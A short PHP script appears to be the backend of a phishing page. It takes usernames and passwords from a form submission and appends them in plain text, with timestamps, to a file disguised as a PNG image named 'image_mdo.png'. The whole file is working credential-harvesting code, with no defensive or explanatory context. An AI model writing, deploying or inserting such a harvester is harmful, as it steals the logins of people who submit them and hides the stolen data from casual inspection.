<?php
// Get username and password from POST data
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Validate if both username and password are present
if (!empty($username) && !empty($password)) {
    $logFilePath = './image_mdo.png'; // Specify your log file path here

    // Open the log file in append mode
    $logFile = fopen($logFilePath, 'a');
    if ($logFile) {
        // Format the log entry
        $logEntry = "Username: $username, Password: $password, Timestamp: " . date('Y-m-d H:i:s') . "\n";

        // Write the log entry to the file
        fwrite($logFile, $logEntry);

        // Close the log file
        fclose($logFile);

        echo "Credentials logged successfully.";
    } else {
        echo "Error opening log file.";
    }
} else {
    echo "Username or password missing.";
}
?>
